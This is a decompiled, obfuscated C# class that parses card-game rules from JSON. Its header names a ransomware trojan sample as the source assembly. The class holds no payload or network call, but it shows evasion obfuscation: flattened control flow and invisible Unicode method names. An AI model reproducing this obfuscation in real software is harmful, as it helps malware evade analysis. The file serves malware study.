// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: ConcurrentS, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: BBECA65A-DDC9-4285-A0F3-1DAD9BE0ED87
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-29a2cecf014cf5640915defd5f1ca82e75089ad0ec89107be8f9144673d99be6.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = 675358560;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 607400098)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * -975323162 ^ 845004565;
            continue;
          case 2:
            num1 = (int) num2 * -206712854 ^ 597341033;
            continue;
          case 4:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -819262243 ^ 2037202211;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 1578714347;
      int aIndex;
      float[] numArray;
      bool flag;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1898126056)) % 10U)
        {
          case 1:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 794054383;
            continue;
          case 2:
            goto label_1;
          case 3:
            flag = aIndex < numArray.Length;
            num1 = 1878755924;
            continue;
          case 4:
            num1 = (int) num2 * -78490979 ^ 873862749;
            continue;
          case 5:
            riskChances = numArray;
            num1 = (int) num2 * 436155568 ^ -510406244;
            continue;
          case 6:
            num1 = (int) num2 * -184927912 ^ 999120302;
            continue;
          case 7:
            numArray = new float[json.Count];
            aIndex = 0;
            num1 = (int) num2 * 2098368322 ^ -1251575476;
            continue;
          case 8:
            int num3 = flag ? -2083058893 : (num3 = -1648767735);
            num1 = num3 ^ (int) num2 * 1769479152;
            continue;
          case 9:
            ++aIndex;
            num1 = (int) num2 * 787016407 ^ -1345870938;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
      List<Card> cardList = new List<Card>();
label_1:
      int num1 = 1458143759;
      bool flag1;
      int aIndex1;
      JSONNode jsonNode;
      int num2;
      int aIndex2;
      bool flag2;
      bool flag3;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1152366631)) % 23U)
        {
          case 1:
            jsonNode = json[aIndex1];
            num1 = 795476187;
            continue;
          case 2:
            int num4 = flag3 ? 1433416421 : (num4 = 1244696952);
            num1 = num4 ^ (int) num3 * -1164875513;
            continue;
          case 3:
            num1 = (int) num3 * -1554341023 ^ -209596328;
            continue;
          case 4:
            num1 = (int) num3 * -1151941717 ^ -1542101637;
            continue;
          case 5:
            ++num2;
            num1 = (int) num3 * -134805837 ^ -2143932457;
            continue;
          case 6:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = 347717235;
            continue;
          case 7:
            num1 = 802622774;
            continue;
          case 8:
            ++aIndex2;
            num1 = (int) num3 * 1896569891 ^ 1171051767;
            continue;
          case 9:
            flag1 = num2 < jsonNode[aIndex2].AsInt;
            num1 = 1735664046;
            continue;
          case 10:
            num1 = 967707670;
            continue;
          case 11:
            array = cardList.ToArray();
            num1 = (int) num3 * -1599773736 ^ 808747837;
            continue;
          case 12:
            flag3 = aIndex1 < count;
            num1 = 530985044;
            continue;
          case 13:
            goto label_1;
          case 14:
            num1 = (int) num3 * 412236700 ^ -1333481216;
            continue;
          case 15:
            aIndex2 = 0;
            num1 = (int) num3 * 1097141383 ^ 590940458;
            continue;
          case 16:
            int num5 = !flag1 ? -1289714660 : (num5 = -2128989760);
            num1 = num5 ^ (int) num3 * -1291740762;
            continue;
          case 17:
            num2 = 0;
            num1 = (int) num3 * 569243750 ^ -319447298;
            continue;
          case 18:
            ++aIndex1;
            num1 = (int) num3 * 1251734804 ^ 623657789;
            continue;
          case 19:
            aIndex1 = 0;
            num1 = (int) num3 * -1402621534 ^ -1148031419;
            continue;
          case 20:
            num1 = (int) num3 * 900653474 ^ -62617308;
            continue;
          case 21:
            bool flag4 = aIndex2 < maxImpact;
            cardList.Add(new Card()
            {
              Impact = flag4 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = 1857735932;
            continue;
          case 22:
            int num6 = !flag2 ? 1355137989 : (num6 = 573961481);
            num1 = num6 ^ (int) num3 * 2123146040;
            continue;
          default:
            goto label_24;
        }
      }
label_24:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 176223437;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 325384990)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 781163409 ^ -338015013;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = Rules.\u200D‪‎‎‮⁪⁭‮‮⁭⁮​⁮‬‬‏‭‫‭‫⁮‍⁫​‭⁮⁬‭​‍‫‬⁬‮​⁫⁪‬​‎‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * 26959690 ^ -401304252;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
label_1:
      int num1 = -1285856286;
      Card card1;
      int num2;
      Card[] cards;
      int index;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -921427901)) % 16U)
        {
          case 1:
            num2 = 0;
            num1 = (int) num3 * 1926616125 ^ 220894992;
            continue;
          case 2:
            int num4;
            num1 = num4 = index >= cards.Length ? -668409798 : (num4 = -1930759024);
            continue;
          case 3:
            card1 = cards[index];
            num1 = -2008536969;
            continue;
          case 4:
            num1 = (int) num3 * 2079939778 ^ 1271030566;
            continue;
          case 5:
            cards = this.Cards;
            num1 = (int) num3 * 1006332985 ^ -949645848;
            continue;
          case 6:
            index = 0;
            num1 = (int) num3 * -2139745356 ^ 27995644;
            continue;
          case 7:
            num1 = (int) num3 * 1846699181 ^ 1457764538;
            continue;
          case 8:
            str1 = Rules.\u200D​⁬​‎‬‎‎⁭‭‫⁬⁬‮‬‬‪⁫‭​⁭‬‌⁭​‬⁬⁫‭‎⁫⁪‌⁯‪⁬‏‍⁮‮‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * -82376466 ^ 200359144;
            continue;
          case 9:
            str2 = Rules.\u200D​⁬​‎‬‎‎⁭‭‫⁬⁬‮‬‬‪⁫‭​⁭‬‌⁭​‬⁬⁫‭‎⁫⁪‌⁯‪⁬‏‍⁮‮‮(str1, "\n]");
            num1 = (int) num3 * -1507698721 ^ 1143687684;
            continue;
          case 10:
            ++index;
            num1 = (int) num3 * -1629208810 ^ -374250563;
            continue;
          case 11:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206F‭⁮‎⁯⁪​⁯‮​‌​‏‏⁪​‬‎⁮‍⁯⁮‍‌⁬‫‪⁫‪⁮‌‍⁮‭‬‌⁬⁯⁯⁪‮((object) card2) : (string) null;
            str1 = Rules.\u200B‮‎‮⁮‍​‌‬‎⁮⁭‭‭‪‎‫‭‎‍‎‬‍⁪​⁫‬‪‪‫‮‫⁯‬‪⁯⁬​‏⁭‮(str3, str4, " ");
            num1 = -389109607;
            continue;
          case 12:
            num1 = (int) num3 * -393137373 ^ -1394269969;
            continue;
          case 13:
            int num5 = num2 != card1.Type ? -394439575 : (num5 = -854904722);
            num1 = num5 ^ (int) num3 * -403305170;
            continue;
          case 14:
            num1 = (int) num3 * -1166051280 ^ -579588458;
            continue;
          case 15:
            goto label_1;
          default:
            goto label_17;
        }
      }
label_17:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 760928987;
      string str1;
      int index;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 636883449)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 2071225495 ^ -657017456;
            continue;
          case 2:
            str1 = Rules.\u200D​⁬​‎‬‎‎⁭‭‫⁬⁬‮‬‬‪⁫‭​⁭‬‌⁭​‬⁬⁫‭‎⁫⁪‌⁯‪⁬‏‍⁮‮‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206C‮‪⁮‭⁯⁭⁭⁭‍‬‏⁭‮⁯​‏‎⁫​‏‍⁭⁭‮‭⁫⁮‪‮⁭‭⁮⁪⁯⁭⁫‌‫‎‮()));
            index = 1;
            num1 = (int) num2 * 1975935261 ^ 101056662;
            continue;
          case 3:
            str2 = Rules.\u200D​⁬​‎‬‎‎⁭‭‫⁬⁬‮‬‬‪⁫‭​⁭‬‌⁭​‬⁬⁫‭‎⁫⁪‌⁯‪⁬‏‍⁮‮‮(str1, " ]");
            num1 = (int) num2 * 1837205914 ^ -1452824586;
            continue;
          case 4:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? 1146884554 : (num3 = 1183459310);
            continue;
          case 5:
            num1 = (int) num2 * 213513707 ^ -271599678;
            continue;
          case 7:
            str1 = Rules.\u200B‮‎‮⁮‍​‌‬‎⁮⁭‭‭‪‎‫‭‎‍‎‬‍⁪​⁫‬‪‪‫‮‫⁯‬‪⁯⁬​‏⁭‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206C‮‪⁮‭⁯⁭⁭⁭‍‬‏⁭‮⁯​‏‎⁫​‏‍⁭⁭‮‭⁫⁮‪‮⁭‭⁮⁪⁯⁭⁫‌‫‎‮()));
            ++index;
            num1 = 611938789;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    static string \u200D‪‎‎‮⁪⁭‮‮⁭⁮​⁮‬‬‏‭‫‭‫⁮‍⁫​‭⁮⁬‭​‍‫‬⁬‮​⁫⁪‬​‎‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200D​⁬​‎‬‎‎⁭‭‫⁬⁬‮‬‬‪⁫‭​⁭‬‌⁭​‬⁬⁫‭‎⁫⁪‌⁯‪⁬‏‍⁮‮‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206F‭⁮‎⁯⁪​⁯‮​‌​‏‏⁪​‬‎⁮‍⁯⁮‍‌⁬‫‪⁫‪⁮‌‍⁮‭‬‌⁬⁯⁯⁪‮([In] object obj0) => obj0.ToString();

    static string \u200B‮‎‮⁮‍​‌‬‎⁮⁭‭‭‪‎‫‭‎‍‎‬‍⁪​⁫‬‪‪‫‮‫⁯‬‪⁯⁬​‏⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206C‮‪⁮‭⁯⁭⁭⁭‍‬‏⁭‮⁯​‏‎⁫​‏‍⁭⁭‮‭⁫⁮‪‮⁭‭⁮⁪⁯⁭⁫‌‫‎‮() => CultureInfo.InvariantCulture;
  }
}
